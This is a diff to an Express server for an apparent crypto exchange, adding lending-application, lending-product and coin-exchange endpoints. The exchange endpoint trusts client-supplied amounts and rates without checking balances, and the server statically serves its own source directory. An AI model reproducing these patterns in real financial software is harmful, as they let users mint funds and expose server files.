+      applicationId,
+      message: "Lending application submitted",
+      amount,
+      rate,
+      term,
+      status: "pending"
+    });
+  } catch (error) {
+    console.error("Error applying for lending:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 获取用户借贷申请列表
+ * GET /api/lending/applications
+ */
+app.get("/api/lending/applications", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const applications = db.prepare(`
+      SELECT id, amount, rate, term, status, appliedAt, createdAt
+      FROM lending_applications
+      WHERE userId = ?
+      ORDER BY createdAt DESC
+      LIMIT 100
+    `).all(userId);
+
+    res.json({
+      success: true,
+      data: applications.map(app => ({
+        id: app.id,
+        amount: app.amount,
+        rate: app.rate + '%',
+        term: app.term + '天',
+        status: app.status === 'pending' ? '待审核' : (app.status === 'approved' ? '已批准' : '已驳回'),
+        appliedAt: app.appliedAt,
+        createdAt: app.createdAt
+      }))
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：获取所有借贷申请
+ * GET /api/admin/lending/applications
+ */
+app.get("/api/admin/lending/applications", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    const applications = db.prepare(`
+      SELECT id, userId, username, amount, rate, term, status, appliedAt, rejectionReason
+      FROM lending_applications
+      WHERE status = 'pending'
+      ORDER BY appliedAt DESC
+    `).all();
+
+    res.json({
+      success: true,
+      data: applications.map(app => ({
+        id: app.id,
+        userId: app.userId,
+        username: app.username,
+        amount: app.amount,
+        rate: app.rate,
+        term: app.term,
+        status: app.status,
+        appliedAt: app.appliedAt,
+        rejectionReason: app.rejectionReason
+      }))
+    });
+  } catch (error) {
+    console.error("Error fetching lending applications:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：批准借贷申请
+ * POST /api/admin/lending/approve
+ */
+app.post("/api/admin/lending/approve", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    const { applicationId } = req.body;
+
+    // 获取申请信息
+    const application = db.prepare("SELECT * FROM lending_applications WHERE id = ?").get(applicationId);
+    if (!application) {
+      return res.status(400).json({ error: "Application not found" });
+    }
+
+    if (application.status !== 'pending') {
+      return res.status(400).json({ error: "Application is not pending" });
+    }
+
+    const now = new Date().toISOString();
+
+    // 更新申请状态
+    db.prepare(`
+      UPDATE lending_applications 
+      SET status = 'approved', approvedAt = ?, approvedBy = ?, updatedAt = ?
+      WHERE id = ?
+    `).run(now, admin.id, now, applicationId);
+
+    // 增加用户余额
+    let assets = {};
+    try {
+      const assetsRecord = db.prepare("SELECT balances FROM user_assets WHERE userId = ?").get(application.userId);
+      if (assetsRecord) {
+        assets = JSON.parse(assetsRecord.balances || '{}');
+      }
+    } catch (e) {
+      assets = { BTC: 0, ETH: 0, USDT: 0, SOL: 0, ADA: 0, XRP: 0, DOGE: 0, LTC: 0 };
+    }
+
+    const newBalance = (assets.USDT || 0) + application.amount;
+    assets.USDT = newBalance;
+
+    const assetsRecord = db.prepare("SELECT * FROM user_assets WHERE userId = ?").get(application.userId);
+    if (assetsRecord) {
+      db.prepare("UPDATE user_assets SET balances = ?, updatedAt = ? WHERE userId = ?")
+        .run(JSON.stringify(assets), now, application.userId);
+    } else {
+      db.prepare("INSERT INTO user_assets (userId, balances, updatedAt) VALUES (?, ?, ?)")
+        .run(application.userId, JSON.stringify(assets), now);
+    }
+
+    console.log(`[Lending] Admin ${admin.username} approved lending for ${application.username}: $${application.amount}`);
+
+    res.json({
+      success: true,
+      message: "Lending application approved",
+      applicationId,
+      username: application.username,
+      amount: application.amount,
+      newBalance: newBalance.toFixed(2)
+    });
+  } catch (error) {
+    console.error("Error approving lending:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：驳回借贷申请
+ * POST /api/admin/lending/reject
+ */
+app.post("/api/admin/lending/reject", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    const { applicationId, reason } = req.body;
+
+    // 获取申请信息
+    const application = db.prepare("SELECT * FROM lending_applications WHERE id = ?").get(applicationId);
+    if (!application) {
+      return res.status(400).json({ error: "Application not found" });
+    }
+
+    if (application.status !== 'pending') {
+      return res.status(400).json({ error: "Application is not pending" });
+    }
+
+    const now = new Date().toISOString();
+
+    // 更新申请状态
+    db.prepare(`
+      UPDATE lending_applications 
+      SET status = 'rejected', approvedBy = ?, rejectionReason = ?, updatedAt = ?
+      WHERE id = ?
+    `).run(admin.id, reason || '', now, applicationId);
+
+    console.log(`[Lending] Admin ${admin.username} rejected lending for ${application.username}: $${application.amount}. Reason: ${reason}`);
+
+    res.json({
+      success: true,
+      message: "Lending application rejected",
+      applicationId,
+      username: application.username,
+      reason: reason || ''
+    });
+  } catch (error) {
+    console.error("Error rejecting lending:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：获取所有借贷产品
+ * GET /api/admin/lending/products
+ */
+app.get("/api/admin/lending/products", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+    
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+    
+    const products = db.prepare("SELECT * FROM lending_products ORDER BY createdAt DESC").all();
+    
+    res.json({
+      success: true,
+      data: products,
+      message: "Lending products retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching lending products:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 管理员：创建借贷产品
+ * POST /api/admin/lending/products
+ */
+app.post("/api/admin/lending/products", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+    
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+    
+    const { name, description, minAmount, maxAmount, rate, term } = req.body;
+    
+    if (!name || minAmount === undefined || maxAmount === undefined || rate === undefined || term === undefined) {
+      return res.status(400).json({ success: false, error: "Missing required fields" });
+    }
+    
+    const id = Date.now().toString();
+    const now = new Date().toISOString();
+    
+    db.prepare(`
+      INSERT INTO lending_products (id, name, description, minAmount, maxAmount, rate, term, createdAt, updatedAt)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(id, name, description, minAmount, maxAmount, rate, term, now, now);
+    
+    const product = db.prepare("SELECT * FROM lending_products WHERE id = ?").get(id);
+    
+    res.json({
+      success: true,
+      data: product,
+      message: "Lending product created successfully"
+    });
+  } catch (error) {
+    console.error("Error creating lending product:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 管理员：更新借贷产品
+ * PUT /api/admin/lending/products/:id
+ */
+app.put("/api/admin/lending/products/:id", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+    
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+    
+    const { id } = req.params;
+    const { name, description, minAmount, maxAmount, rate, term, enabled } = req.body;
+    
+    const product = db.prepare("SELECT * FROM lending_products WHERE id = ?").get(id);
+    if (!product) {
+      return res.status(404).json({ success: false, error: "Product not found" });
+    }
+    
+    const now = new Date().toISOString();
+    
+    db.prepare(`
+      UPDATE lending_products 
+      SET name = ?, description = ?, minAmount = ?, maxAmount = ?, rate = ?, term = ?, enabled = ?, updatedAt = ?
+      WHERE id = ?
+    `).run(
+      name || product.name,
+      description !== undefined ? description : product.description,
+      minAmount !== undefined ? minAmount : product.minAmount,
+      maxAmount !== undefined ? maxAmount : product.maxAmount,
+      rate !== undefined ? rate : product.rate,
+      term !== undefined ? term : product.term,
+      enabled !== undefined ? enabled : product.enabled,
+      now,
+      id
+    );
+    
+    const updatedProduct = db.prepare("SELECT * FROM lending_products WHERE id = ?").get(id);
+    
+    res.json({
+      success: true,
+      data: updatedProduct,
+      message: "Lending product updated successfully"
+    });
+  } catch (error) {
+    console.error("Error updating lending product:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 管理员：删除借贷产品
+ * DELETE /api/admin/lending/products/:id
+ */
+app.delete("/api/admin/lending/products/:id", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+    
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+    
+    const { id } = req.params;
+    
+    const product = db.prepare("SELECT * FROM lending_products WHERE id = ?").get(id);
+    if (!product) {
+      return res.status(404).json({ success: false, error: "Product not found" });
+    }
+    
+    db.prepare("DELETE FROM lending_products WHERE id = ?").run(id);
+    
+    res.json({
+      success: true,
+      message: "Lending product deleted successfully"
+    });
+  } catch (error) {
+    console.error("Error deleting lending product:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 用户：获取可用的借贷产品
+ * GET /api/lending/products
+ */
+app.get("/api/lending/products", (req, res) => {
+  try {
+    const products = db.prepare("SELECT * FROM lending_products WHERE enabled = 1 ORDER BY createdAt DESC").all();
+    
+    res.json({
+      success: true,
+      data: products,
+      message: "Lending products retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching lending products:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 用户：提交币种兑换
+ * POST /api/exchange/submit
+ */
+app.post("/api/exchange/submit", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const { fromCoin, toCoin, fromAmount, toAmount, exchangeRate, notes } = req.body;
+    
+    if (!fromCoin || !toCoin || !fromAmount || !toAmount || !exchangeRate) {
+      return res.status(400).json({ success: false, error: "Missing required fields" });
+    }
+
+    const user = db.prepare("SELECT * FROM users WHERE id = ?").get(userId);
+    if (!user) {
+      return res.status(404).json({ success: false, error: "User not found" });
+    }
+
+    const id = "ex_" + Date.now();
+    const now = new Date().toISOString();
+    const fee = fromAmount * 0.002; // 0.2% 手续费
+    
+    db.prepare(`
+      INSERT INTO exchange_orders (id, userId, username, fromCoin, toCoin, fromAmount, toAmount, exchangeRate, fee, status, notes, createdAt, updatedAt)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(id, userId, user.username, fromCoin, toCoin, fromAmount, toAmount, exchangeRate, fee, 'completed', notes || '', now, now);
+
+    // 更新用户资产（扣除fromCoin，增加toCoin）
+    const assets = db.prepare("SELECT balances FROM user_assets WHERE userId = ?").get(userId);
+    let balances = assets ? JSON.parse(assets.balances) : {};
+    
+    balances[fromCoin] = (balances[fromCoin] || 0) - fromAmount;
+    balances[toCoin] = (balances[toCoin] || 0) + toAmount;
+    
+    db.prepare("UPDATE user_assets SET balances = ?, updatedAt = ? WHERE userId = ?").run(
+      JSON.stringify(balances),
+      now,
+      userId
+    );
+
+    res.json({
+      success: true,
+      data: {
+        id,
+        fromCoin,
+        toCoin,
+        fromAmount,
+        toAmount,
+        exchangeRate,
+        fee,
+        status: 'completed',
+        createdAt: now
+      },
+      message: "Exchange submitted successfully",
+      newBalance: balances
+    });
+  } catch (error) {
+    console.error("Error submitting exchange:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 用户：获取我的兑换记录
+ * GET /api/exchange/myrecords
+ */
+app.get("/api/exchange/myrecords", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const records = db.prepare(`
+      SELECT * FROM exchange_orders 
+      WHERE userId = ? 
+      ORDER BY createdAt DESC
+    `).all(userId);
+
+    res.json({
+      success: true,
+      data: records,
+      message: "Exchange records retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching exchange records:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台：获取所有用户兑换记录
+ * GET /api/admin/exchange/records
+ */
+app.get("/api/admin/exchange/records", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const records = db.prepare(`
+      SELECT * FROM exchange_orders 
+      ORDER BY createdAt DESC
+    `).all();
+
+    res.json({
+      success: true,
+      data: records,
+      message: "All exchange records retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching admin exchange records:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台：获取特定用户的兑换记录
+ * GET /api/admin/exchange/user/:userId
+ */
+app.get("/api/admin/exchange/user/:userId", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const adminId = verifyToken(token);
+    
+    if (!adminId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(adminId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const { userId } = req.params;
+    const records = db.prepare(`
+      SELECT * FROM exchange_orders 
+      WHERE userId = ? 
+      ORDER BY createdAt DESC
+    `).all(userId);
+
+    const user = db.prepare("SELECT username FROM users WHERE id = ?").get(userId);
+
+    res.json({
+      success: true,
+      data: records,
+      user: user ? user.username : 'Unknown',
+      message: "User exchange records retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching user exchange records:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 在所有 API 路由之后，添加静态文件服务器
+app.use(express.static(__dirname));
+
+// 如果没有匹配的路由，返回 404 JSON（而不是 HTML）
+app.use((req, res) => {
+  res.status(404).json({ success: false, message: 'Not Found' });
+});
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', async () => {
+
+// 仅在非 Vercel 环境中启动服务器
+if (process.env.VERCEL !== '1') {
+  app.listen(PORT, '0.0.0.0', async () => {
   // 初始化实时价格
   try {
     await fetchRealPrices();
@@ -5972,6 +7456,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   console.log(`  GET  /api/market-detail/:pair- 市场详情`);
   console.log(`  GET  /api/market-details     - 所有市场详情`);
 });
+}
 
 // ==================== 模拟市场数据 ====================
 // 生成实时价格数据
@@ -6702,3 +8187,11 @@ app.get("/api/admin/pages", (req, res) => {
     res.status(500).json({ success: false, error: error.message });
   }
 });
+
+// 在 Vercel 环境中导出应用，否则启动服务器
+if (process.env.VERCEL === '1') {
+  module.exports = app;
+} else {
+  console.log('Starting server...');
+  // 服务器启动代码在上面的 app.listen 中
+}
